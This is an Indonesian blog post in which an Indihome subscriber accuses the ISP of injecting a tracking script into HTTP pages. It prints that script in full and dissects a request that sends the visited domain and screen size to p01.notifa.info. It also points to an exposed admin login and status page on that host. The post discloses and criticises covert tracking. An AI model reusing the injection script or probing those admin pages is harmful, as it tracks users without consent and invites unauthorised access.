---
published: true
---
## Derita Pelanggan Indihome, Sudah Bayar Datanya Malah Dicuri

Indihome adalah salah satu penyedia layanan internet terbesar di Indonesia. Akhir 2019 setidaknya mereka memiliki 7 juta pelanggan yang tersebar di seluruh Indonesia. Tahun 2020 ini mereka menargetkan memiliki 8,3 juta pelanggan. Total pendapatan perusahaan BUMN ini juga fantastis, setiap tahunnya 18 Triliun. Dibalik semua pencapaian itu, Indihome selama ini dikenal sebagai penyedia layanan internet dengan kualitas layanan yang paling banyak mendapatkan keluhan. Keluhan itu sendiri sering kita lihat di berbagai media sosial yang dibagikan oleh para pelanggan mereka.

Saya sendiri juga menggunakan Indihome untuk internet di rumah, karena tak ada pilihan lain. Saat ini rumah saya hanya terjangkau layanan milik Indihome. Setelah menjadi pelanggan Indihome sekian tahun, saya merasakan berbagai macam gangguan yang saya dapatkan selama berlangganan. Setidaknya ketika tulisan ini ditulis, saya akan menjabarkan gangguan yang saya dapatkan yang menurut saya adalah perbuatan yang melanggar hukum. /

### Tracker Untuk Mencuri Browsing History Pengguna

Saya menggunakan kata "mencuri" karena mengambil sesuatu tanpa izin sangat tepat disebut mencuri. Selain ini dilakukan secara diam-diam, kebanyakan orang awam pasti tidak menyadari hal ini. Jika kamu berlangganan Indihome di rumah, ketika kamu mengunjungi sebuah website yang belum menggunakan SSL atau tepatnya masih menggunakan http belum https, Indihome akan mengambil browsing history milik kamu ketika kamu mengunjungi website tersebut. Penjelasannya dengan contoh kasus sebagai berikut :

Saya sedang mencari sebuah tutorial di Google menggunakan kata kunci "penyebab bulu kucing kusam", setelah itu google menampilkan artikel berikut ini http://www.petnyaku.com/health/dari-kondisi-bulu-bisa-diketahui-kucing-memiliki-masalah-kesehatan/, ketika saya mengunjungi website tersebut, karena belum menggunakan SSL (masih http) Indihome kemudian bisa menyisipkan sebuah script yang berguna untuk mencuri browsing history milik kita. Ketika kamu view-source website yang kamu kunjungi tersebut, kita akan menemukan script seperti berikut ini di bagian paling bawah :

```javascript
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncX4P8RMEi6KILNdTu4aXhNvLHVzbE%2fcmJIngqm1SZDgEuphLBm%2f%2f4J1tqyuJYFIkMo%2fASaCza7wmTnLDVhjapRu7oWDCCMdyke7%2bhuxVZH51%2fuUDPDOXYbO3OvmkgHxYCfjjwMLv7OAk2mniAERkIHP0HfTLqo6QXe3pw52b5QLmRu4fOIgzvm88MQ6IJOBTOIPNiJCOi6Chsi9XyFgUfHfgBC17rl8mNyhSAjcshFZFnBd%2ba9uZTBebbZLfKrTdu8upidxRX7Aa3SKTNOaaXkLXkbfgIcB1BZe1i%2f35C0ffGwbfZQzmIjYUmbKvNvzknUAoNu40XCBZM9wBW721NIq4fB0g%2fcyvrUfF3XKmEhpgjeDdA1BzLdrOJL5NFPM%2bsCXDRxhkd4NSkSlNY7H%2bE9qQGWSapNJb3lYnA%2f5RDQqkvOil6xgADRcXjy2bSgJgLgfXC3mH9QMnKPPXBB%2b98E%2bFrOLIh1WtFm2vLLLq6zXs4lMXN%2bi45r%2bTzjQMoMxW5kHIYK%2f8jAJI%2fn%2fx7JgQu56qEc0fTuMy%2bAFXUfdQhfAznNQmIkZE6h9G8Jzze%2fGKPccenLrp3aPzilW%2bjvA%2bb6YWYD4q%2bVNk2fOlg6GYynzBrTpzexxI6BXqmN18k4ZShMLXrN85aeqKg%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
```
Script ini berguna untuk mengirimkan sebuah request ke server milik Indihome. Contoh request nya adalah sebagai berikut :
![indihome1.png]({{site.baseurl}}/images/indigo/indihome1.png)
Jika dilihat dalam versi penuhnya, maka request tersebut akan terlihat seperti ini :

```javascript
http://p01.notifa.info/3fsmd3/request?id=1&enc=9UwkxLgY9&params=4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncX4P8RMEi6KIKtVIeBXVsA20nWKYcnall52ezULp%2fmcTfNfFan0cuYiikcLCpeACUzm1BNnnttoND4zO0lWiBKmHrmr%2bi0d90xJX8mWy7ZHbcj%2fnUElz3UxVDGSMsk9D8IFPr9ZDr6yQpVB2XSlCgjPMNQqcsjqDmJdgB5HOfuQqM4QVdagHG06ugiNYOHvvZcrSqDU8hd%2bXAoWDzREWfoBmvPR8TGobmg2mbp3lMaVRLp8jIL4%2fRQZGXSBrQ9CvV4%2f2IHJYWvdhQC3l%2fzv%2fvT5Aq8kWuJ4LweWoL0DYhLQJ1Rwm5J8J%2btwOOdma5pOSegNhOqAvJjvR5YJ0aaAgNKadpheMvCbF2yLm%2fn2iWdduS7%2bimKg%2bS5CGCTi3Kpo9Ng24YpdQdyN%2fzLG1ipRo38TJ8ongnstvlpR9Kj9hqpSEqwka%2fxjR%2btvRWQjT19zs5MsP3xXji9qFgAIxM6CBoQbxS21AYbuhVE3PJ8TpV53ccq6LpRa%2f5d%2bRgKoCygtm%2bH5pEvgrCgPtElofFWiLUs3b6NUtmI94nuv%2fAjnfYGtj837edhisK0daWSvke8IjzwChxw2%2bJETgU8e5qqlLCRaHOuJcb1y%2fni8v%2bUdts%2fbjPfa0xlCPa2%2bm%2bKfkojGb9dFiiXan3VK3w%3d&idc_r=61826754674&domain=www.petnyaku.com&sw=2304&sh=1296
```

Beberapa parameter diatas berguna untuk mengambil browsing history dan juga resolusi layar perangkat yang kamu gunakan. 

-Website yang kamu kunjungi

```javascript
domain=www.petnyaku.com
```

-Resolusi layar

```javascript
sw=2304&sh=1296
```

Jadi setiap kali kamu mengunjungi sebuah website yang belum menggunakan SSL (masih http) maka Indihome dengan leluasa akan mengambil data website yang kamu kunjungi tersebut. 

### Dibalik p01.notifa.info

Karena saya merasa cukup terganggu da juga penasaran, saya kemudian mencari tau apa yang ada dibalik website tracker milik Indihome ini hanya bermodalkan Google. Kemudian saya mendapatkan 2 link berikut :

Ketika saya mengakses http://p01.notifa.info/3fsmd3/wsadmin/auth/login, halaman tersebut merupakan tempat untuk login internal yang mungkin digunakan content management.

Lalu link berikutnya adalah http://p01.notifa.info/info/apc/ :
Halaman ini lebih menarik karena berisi statistik dan juga struktur kode yang digunakan untuk website tracker ini. Pada tanggal 14 September 2020 03:00 WIB, pada tab status total hits mencapai angka 26,681,371,055 (26,6 miliar).
